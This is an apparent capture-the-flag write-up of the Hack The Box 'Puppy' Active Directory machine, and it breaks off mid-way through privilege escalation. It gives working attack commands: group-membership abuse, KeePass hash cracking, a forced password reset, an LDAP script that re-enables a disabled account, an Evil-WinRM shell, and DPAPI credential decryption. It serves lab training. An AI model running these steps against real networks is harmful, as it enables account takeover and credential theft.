![[Puppy00.png]]
### Description
As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!

#### Entry Credentials

```username
levi.james
```

```password
KingofAkron2025!
```

### Network Scan

#### Rustscan

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.70:53
Open 10.10.11.70:88
Open 10.10.11.70:135
Open 10.10.11.70:139
Open 10.10.11.70:111
Open 10.10.11.70:636
Open 10.10.11.70:464
Open 10.10.11.70:445
Open 10.10.11.70:5985
Open 10.10.11.70:9389
Open 10.10.11.70:49664
Open 10.10.11.70:49667
Open 10.10.11.70:49669
Open 10.10.11.70:49674
Open 10.10.11.70:49689
Open 10.10.11.70:61431
Open 10.10.11.70:65181
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.11.70
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 02:32 UTC
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 02:32
Scanning 10.10.11.70 [4 ports]
Completed Ping Scan at 02:32, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 02:32
Scanning puppy.htb (10.10.11.70) [17 ports]
Discovered open port 445/tcp on 10.10.11.70
Discovered open port 53/tcp on 10.10.11.70
Discovered open port 135/tcp on 10.10.11.70
Discovered open port 61431/tcp on 10.10.11.70
Discovered open port 111/tcp on 10.10.11.70
Discovered open port 9389/tcp on 10.10.11.70
Discovered open port 139/tcp on 10.10.11.70
Discovered open port 49689/tcp on 10.10.11.70
Discovered open port 636/tcp on 10.10.11.70
Discovered open port 49674/tcp on 10.10.11.70
Discovered open port 88/tcp on 10.10.11.70
Discovered open port 49664/tcp on 10.10.11.70
Discovered open port 49669/tcp on 10.10.11.70
Discovered open port 65181/tcp on 10.10.11.70
Discovered open port 5985/tcp on 10.10.11.70
Discovered open port 49667/tcp on 10.10.11.70
Discovered open port 464/tcp on 10.10.11.70
Completed SYN Stealth Scan at 02:32, 0.30s elapsed (17 total ports)
Initiating Service scan at 02:32
Scanning 17 services on puppy.htb (10.10.11.70)
Completed Service scan at 02:33, 57.66s elapsed (17 services on 1 host)
NSE: Script scanning 10.10.11.70.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 02:33
Completed NSE at 02:33, 0.56s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 02:33
Completed NSE at 02:34, 17.34s elapsed
Nmap scan report for puppy.htb (10.10.11.70)
Host is up, received echo-reply ttl 126 (0.14s latency).
Scanned at 2025-07-09 02:32:49 UTC for 76s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-07-08 20:39:50Z)
111/tcp   open  rpcbind?      syn-ack ttl 126
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
636/tcp   open  tcpwrapped    syn-ack ttl 126
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
61431/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
65181/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.22 seconds
           Raw packets sent: 21 (900B) | Rcvd: 18 (776B)


```

### Enumeration

#### SmbMap 1
I tried Running SMBMap and SMBClient but no luck as the user given has no access to the network drives.
```bash

```
We can see that DEVS share is there for developers of the puppy domain but we dont have any access to that
#### RPCCLIENT

```bash
rpcclient -U levi.james@puppy.htb%KingofAkron2025! puppy.htb
rpcclient $> querydominfo
Domain:		PUPPY
Server:		
Comment:	
Total Users:	44
Total Groups:	0
Total Aliases:	18
Sequence No:	1
Force Logoff:	18446744073709551615
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x0
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

List of Users extracted:
```text
Administrator
Geust
krbtgt
levi.james
ant.edwards
adam.silver
jamie.willians
steph.cooper
steph.cooper_adm
```

#### Bloodhound 1
Start blood hound and get the bloodhound ingester files using bloodhound python
```bash
bloodhound-python -u levi.james -p KingofAkron2025! -ns 10.10.11.70 -d puppy.htb -c All --zip
```
After that lets upload the zip file to the bloodhound webapp and check our user

![[Puppy01.png]]
Here we can see that the user given to us is member of 2 groups one is a common group `
`Domain Users` and other one is `HR` which is interesting lets check the HR group.
![[Puppy02.png]]
`HR` group has GenericWrite privilege on the `DEVS` group which means we can add our user into the DEVS group lets try doing that since we found the smb share for dev group we might be able to access it after that.
So the given command in linux abuse side of bloodhound is of net rpc 
```bash
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```
So our final command will look like this
```bash
net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
```
Now lets verify if the user is added to the DEVS group
```bash
net rpc group members "DEVELOPERS" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
```
output:
```bash
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```
Its added now lets check the smbmap using this command
#### SmbMap 2
```bash
smbmap -H puppy.htb -u levi.james -p KingofAkron2025!
```
Output
```bash
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.70:445	Name: puppy.htb           	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DEV                                               	READ ONLY	DEV-SHARE for PUPPY-DEVS
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections                                                                                                     
```
Now we can see READ ONLY access to `DEV-SHARE`

#### SMBClient
Now that we have access to DEV-SHARE lets see if we can find any useful stuff in there
```bash
smbclient //puppy.htb/DEV -U puppy.htb/levi.james%"KingofAkron2025!" 
```

Output
```bash
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 12:37:57 2025
  ..                                  D        0  Sat Mar  8 22:22:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 12:39:12 2025
  Projects                            D        0  Sat Mar  8 22:23:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 07:55:46 2025

		5080575 blocks of size 4096. 1637057 blocks available

```
We found keePaas and Recovery.kdbx file Keepass is a password manager and recovery.kdbx might be a Backup file?? lets crack it using john and see if we find anything useful.
```bash
keepass2john recovery.kdbx 
```
Output Hash
```bash
recovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
```
Now save this in a file and run JTR!
```bash
john recovery.hash --wordlist=rockyou.txt
```
Output
```bash
KeePass-opencl: Argon2 hash(es) not supported, skipping.
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-Argon2-opencl"
Use the "--format=KeePass-Argon2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 37 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 4 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Failed to use huge pages (not pre-allocated via sysctl? that's fine)
liverpool        (recovery)     
1g 0:00:00:16 DONE (2025-07-10 01:06) 0.06028g/s 2.893p/s 2.893c/s 2.893C/s purple..1234567890
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We got the password of keepass its 
```password keepass
liverpool
```
Now open keepass in your linux machine if its not installed install it using
```bash
sudo apt install keepass2
```

![[Puppy03.png]]
Now go to File --> Open --> Open FIle and select recovery.kdbx file then it will ask for this
![[Puppy04.png]]
Enter master password which we got from john and click OK.
![[Puppy05.png]]
Here we can see the password of the following users and we can use these to enum further


#### Bloodhound 2

Now emuerating the users we found above in bloodhound we found 2 interesting users 
##### User 1
```user1
ADAM.SILVER@PUPPY.HTB
```
![[Puppy06.png]]
Adam is  a member of Remote Management group which means we can try loggin in using winrm:

```bash
evil-winrm -i puppy.htb -u adam.silver -p 'PASSFORADAM!'
```
![[Puppy07.png]]
It failed, maybe the password we got from keepass is old?
##### User 2
```user2
ANT.EDWARDS@PUPPY.HTB
```
Anthony is a member of `Senior Devs` group
![[Puppy08.png]]
Now checking the `Senior Devs` Group, It has outbound access control `GenericALL` on User `Adam` which means we can Force change the password of `Adam`.
![[Puppy09.png]]
We can use RPC command to do that 
```bash
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```
End command
```bash
net rpc password "ADAM.SILVER" "newP@ssword2022" -U "puppy.htb"/"ANT.EDWARDS"%"edwardspass!" -S 10.10.11.70
```
Verify
![[Puppy10.png]]
Hmm it says account disabled, there might be a way to enable this but i wrote a custom ldap query python script to enable the account
```python
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE

server = Server("10.10.11.70", get_info=ALL)
conn = Connection(server, user="puppy.htb\\ant.edwards", password="edwardsPassword!", authentication=NTLM, auto_bind=True)

conn.search("dc=puppy,dc=htb", "(sAMAccountName=adam.silver)", attributes=["distinguishedName", "userAccountControl"])
entry = conn.entries[0]
dn = entry.distinguishedName.value
uac = int(entry.userAccountControl.value)
print(f"[+] DN: {dn}\n[+] Current userAccountControl: {uac}")

# Clear ACCOUNTDISABLE (bit 0x2)
new_uac = uac & ~0x2

conn.modify(dn, {'userAccountControl': [(MODIFY_REPLACE, [str(new_uac)])]})
if conn.result['result'] == 0:
    print("[+] Account successfully enabled.")
else:
    print(f"[-] Error: {conn.result}")

```

Check the output
```bash
python3 py.py 
[+] DN: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
[+] Current userAccountControl: 66050
[+] Account successfully enabled.
```
Now try again
```bash
net rpc group members "DEVELOPERS" -U "puppy.htb"/"adam.silver"%"newP@ssword2022" -S 10.10.11.70
```

```output
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```
Now try EvilWinrm again and fetch the user flag
```bash
evil-winrm -i puppy.htb -u 'ADAM.SILVER' -p 'newP@ssword2022'
```
Output
```bash
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd ..
*Evil-WinRM* PS C:\Users\adam.silver> cd Desktop
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> ls


    Directory: C:\Users\adam.silver\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
-ar---          7/9/2025   5:47 PM             34 user.txt

```

#### Flag 1
```
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
141a5{RETRACTED}4a760fc
```
### Privilege Escalation
**ADvise: After logging in quickly get a meterpreter shell if you can so that you can enumerate seamlessly.**
After getting the shell i couldnt enumerate further using bloodhound or any external means(yes i have tried smb bruteforcing using steph.cooper as username and passwords similar to Steph2025!).
There is a file located at
```cmd
C:/Backups/site-backup-2024-12-30.zip
```
Download and extract it then you will find this file
```bash
nms-auth-config.xml.bak
```
It contains the password for `steph.cooper`.
Now after that too moving around was tough there was literally 0 attack surface with steph or i am just a noob haxor.
I found something interesting in:
```cmd
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials
```
the file 
![[Puppy11.png]]
After researching a bit online the password we got for is of DPAPI.
I found this awesome blog on [medium](https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb) and followed it.
Now according to that blog there is one more file in 
```cmd
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\\556a2412-1275-4ccf-b721-e6a0b4f90407
```

Lets download both the files and save it in our local linux machine and use impacket-dpapi to decode the password.
```bash
dpapi.py masterkey -file ../../../HTB/Puppy/556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'Steph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 
```
1. According to the blog the file we downloaded from Protect directory is our masterkey. It is located inside the SID of the user.
2. Get the SID from the folder and use in -sid tag
3. Steph2025! is not a real password ffs.

Output
```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f{REDACTED}cbfdcaf319e9c84

```
Now we will use the Decrypted Key to get the password from Credentials blob
```bash
dpapi.py credential -file ../../../HTB/Puppy/C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a5707{REDACTED}e9c84
```
We have used the C8--- file as the credential file (From the blog)
